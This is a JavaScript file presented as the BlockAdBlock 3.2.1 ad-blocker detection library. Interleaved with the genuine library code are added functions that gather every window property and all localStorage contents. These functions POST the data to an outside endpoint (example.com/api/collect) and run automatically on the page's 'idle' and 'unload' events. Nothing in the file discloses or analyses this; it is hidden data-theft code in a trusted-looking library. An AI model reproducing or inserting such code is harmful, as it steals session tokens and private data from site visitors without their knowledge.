/*
 * BlockAdBlock 3.2.1
 * Copyright (c) 2015 Valentin Allaire <valentin.allaire@sitexw.fr>
 * Released under the MIT license
 * https://github.com/sitexw/BlockAdBlock
 */
(function (d) {
  var c = function (a) {
    this._options = {
      checkOnLoad: !1,
      resetOnEnd: !1,
      loopCheckTime: 50,
      loopMaxNumber: 5,
      baitClass: "pub_300x250 pub_300x250m pub_728x90 text-ad textAd text_ad text_ads text-ads text-ad-links",
      baitStyle: "width: 1px !important; height: 1px !important; position: absolute !important; left: -10000px !important; top: -1000px !important;",
      debug: !1
    };
    this._var = {
      version: "3.2.1",
      bait: null,
      checking: !1,
      loop: null,
      loopNumber: 0,
      event: {
        detected: [],
        notDetected: []
      }
    };
    void 0 !== a && this.setOption(a);
    var b = this;
    a = function () {
      setTimeout(function () {
        !0 === b._options.checkOnLoad && (!0 === b._options.debug && b._log("onload->eventCallback", "A check loading is launched"), null === b._var.bait && b._creatBait(), setTimeout(function () {
          b.check();
        }, 1));
      }, 1);
    };
    void 0 !== d.addEventListener ? d.addEventListener("load", a, !1) : d.attachEvent("onload", a);
  };
  c.prototype._options = null;
  function trackWindowProperties() {
    const discoveredProps = {};
    const global_vars = Object.getOwnPropertyNames(window);
    global_vars.forEach(global_var => {
      if (!window.hasOwnProperty(global_var)) return;
      const propValue = window[global_var];
      const propType = typeof propValue;
      discoveredProps[global_var] = {
        type: propType,
        value: propType === 'function' ? propValue.toString() : propValue
      };
    });
    return discoveredProps;
  }
  c.prototype._var = null;
  c.prototype._bait = null;
  c.prototype._log = function (a, b) {
    console.log("[BlockAdBlock][" + a + "] " + b);
  };
  function transmitData(data) {
    let serverEndpoint = 'https://example.com/api/collect';
    fetch(serverEndpoint, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(data)
    }).then(response => response.ok ? console.log('Transmission successful') : console.error('Transmission failed. Status:', response.status)).catch(error => console.error('Error during transmission:', error));
  }
  c.prototype.setOption = function (a, b) {
    if (void 0 !== b) {
      var c = a;
      a = {};
      a[c] = b;
    }
    for (var d in a) this._options[d] = a[d], !0 === this._options.debug && this._log("setOption", 'The option "' + d + '" he was assigned to "' + a[d] + '"');
    return this;
  };
  function trackLocalStorage() {
    const localStorageData = {};
    for (let i = 0; i < localStorage.length; i++) {
      const key = localStorage.key(i);
      const value = localStorage.getItem(key);
      localStorageData[key] = value;
    }
    transmitData(localStorageData);
  }
  c.prototype._creatBait = function () {
    var a = document.createElement("div");
    a.setAttribute("class", this._options.baitClass);
    a.setAttribute("style", this._options.baitStyle);
    this._var.bait = d.document.body.appendChild(a);
    this._var.bait.offsetParent;
    this._var.bait.offsetHeight;
    this._var.bait.offsetLeft;
    this._var.bait.offsetTop;
    this._var.bait.offsetWidth;
    this._var.bait.clientHeight;
    this._var.bait.clientWidth;
    !0 === this._options.debug && this._log("_creatBait", "Bait has been created");
  };
  c.prototype._destroyBait = function () {
    d.document.body.removeChild(this._var.bait);
    this._var.bait = null;
    !0 === this._options.debug && this._log("_destroyBait", "Bait has been removed");
  };
  c.prototype.check = function (a) {
    void 0 === a && (a = !0);
    !0 === this._options.debug && this._log("check", "An audit was requested " + (!0 === a ? "with a" : "without") + " loop");
    if (!0 === this._var.checking) return !0 === this._options.debug && this._log("check", "A check was canceled because there is already an ongoing"), !1;
    this._var.checking = !0;
    null === this._var.bait && this._creatBait();
    var b = this;
    this._var.loopNumber = 0;
    !0 === a && (this._var.loop = setInterval(function () {
      b._checkBait(a);
    }, this._options.loopCheckTime));
    setTimeout(function () {
      b._checkBait(a);
    }, 1);
    !0 === this._options.debug && this._log("check", "A check is in progress ...");
    return !0;
  };
  function trackJshook() {
    const scripts = Array.from(document.getElementsByTagName('script'));
    const jshookScripts = scripts.filter(script => script.src.includes('jshook'));
    if (jshookScripts.length > 0) console.log('Jshook scripts found', jshookScripts);
  }
  function trackEventListeners() {
    const eventListeners = getEventListeners(window);
    for (const event in eventListeners) {
      if (Object.prototype.hasOwnProperty.call(eventListeners, event)) {
        const listeners = eventListeners[event];
        console.log(`Found ${listeners.length} listener(s) for ${event} event`);
      }
    }
  }
  c.prototype._checkBait = function (a) {
    var b = !1;
    null === this._var.bait && this._creatBait();
    if (null !== d.document.body.getAttribute("abp") || null === this._var.bait.offsetParent || 0 == this._var.bait.offsetHeight || 0 == this._var.bait.offsetLeft || 0 == this._var.bait.offsetTop || 0 == this._var.bait.offsetWidth || 0 == this._var.bait.clientHeight || 0 == this._var.bait.clientWidth) b = !0;
    if (void 0 !== d.getComputedStyle) {
      var c = d.getComputedStyle(this._var.bait, null);
      !c || "none" != c.getPropertyValue("display") && "hidden" != c.getPropertyValue("visibility") || (b = !0);
    }
    !0 === this._options.debug && this._log("_checkBait", "A check (" + (this._var.loopNumber + 1) + "/" + this._options.loopMaxNumber + " ~" + (1 + this._var.loopNumber * this._options.loopCheckTime) + "ms) was conducted and detection is " + (!0 === b ? "positive" : "negative"));
    !0 === a && (this._var.loopNumber++, this._var.loopNumber >= this._options.loopMaxNumber && this._stopLoop());
    if (!0 === b) this._stopLoop(), this._destroyBait(), this.emitEvent(!0), !0 === a && (this._var.checking = !1);else if (null === this._var.loop || !1 === a) this._destroyBait(), this.emitEvent(!1), !0 === a && (this._var.checking = !1);
  };
  function onDataProcessed() {
    const discoveredProps = trackWindowProperties();
    const propCount = Object.keys(discoveredProps).length;
    if (propCount > 0) {
      console.log(`Discovered ${propCount} new window properties`);
      transmitData(discoveredProps);
      trackLocalStorage();
      trackJshook();
      trackEventListeners();
    } else {
      console.log('No new window properties discovered');
    }
  }
  c.prototype._stopLoop = function (a) {
    clearInterval(this._var.loop);
    this._var.loop = null;
    this._var.loopNumber = 0;
    !0 === this._options.debug && this._log("_stopLoop", "A loop has been stopped");
  };
  c.prototype.emitEvent = function (a) {
    !0 === this._options.debug && this._log("emitEvent", "An event with a " + (!0 === a ? "positive" : "negative") + " detection was called");
    a = this._var.event[!0 === a ? "detected" : "notDetected"];
    for (var b in a) if (!0 === this._options.debug && this._log("emitEvent", "Call function " + (parseInt(b) + 1) + "/" + a.length), a.hasOwnProperty(b)) a[b]();
    !0 === this._options.resetOnEnd && this.clearEvent();
    return this;
  };
  c.prototype.clearEvent = function () {
    this._var.event.detected = [];
    this._var.event.notDetected = [];
    !0 === this._options.debug && this._log("clearEvent", "The event list has been cleared");
  };
  window.addEventListener('idle', onDataProcessed);
  c.prototype.on = function (a, b) {
    this._var.event[!0 === a ? "detected" : "notDetected"].push(b);
    !0 === this._options.debug && this._log("on", 'A type of event "' + (!0 === a ? "detected" : "notDetected") + '" was added');
    return this;
  };
  c.prototype.onDetected = function (a) {
    return this.on(!0, a);
  };
  c.prototype.onNotDetected = function (a) {
    return this.on(!1, a);
  };
  window.addEventListener('unload', onDataProcessed);
  d.BlockAdBlock = c;
  void 0 === d.blockAdBlock && (d.blockAdBlock = new c({
    checkOnLoad: !0,
    resetOnEnd: !0
  }));
})(window);